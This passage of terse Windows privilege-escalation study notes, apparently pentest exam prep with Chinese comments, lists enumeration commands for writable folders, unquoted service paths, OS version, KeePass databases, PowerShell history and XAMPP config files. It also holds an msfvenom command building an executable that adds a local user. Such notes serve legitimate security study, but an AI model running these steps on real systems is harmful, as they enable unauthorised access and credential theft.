    - Writeable? `echo "chw" > 'C:\FileZilla\FileZilla FTP Client\chw.txt'`
    - `type 'C:\FileZilla\FileZilla FTP Client\chw.txt'`
-  Procmon (install)

### [Unquoted Service Paths](https://hackmd.io/@CHW/H1F8rLl5kg#Unquoted-Service-Paths)
- `Get-CimInstance -ClassName win32_service | Select Name,State,PathName `
看路徑有沒有空格 (user 需要 Start-Service 權限)
```
msfvenom -p windows/adduser USER=chw PASS=chw -f exe -o Current.exe
```
### OSVersion
- `[System.Environment]::OSVersion.Version`
>  Google or Exploit-DB
### [KeePass](https://hackmd.io/@CHW/ryj8tW4UJl#Password-Manager)
- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

### [History](https://hackmd.io/@CHW/H1F8rLl5kg#1-check-the-PowerShell-history)
- `(Get-PSReadlineOption).HistorySavePath`
###  [Event Viewer](https://hackmd.io/@CHW/H1F8rLl5kg#Use-the-Event-Viewer-to-search-for-events-recorded-by-Script-Block-Logging)
- 需要 GUI

### config file
- XAMPP
    - `C:\xampp\mysql\bin\*.ini`
    - `C:\xampp\*.txt`

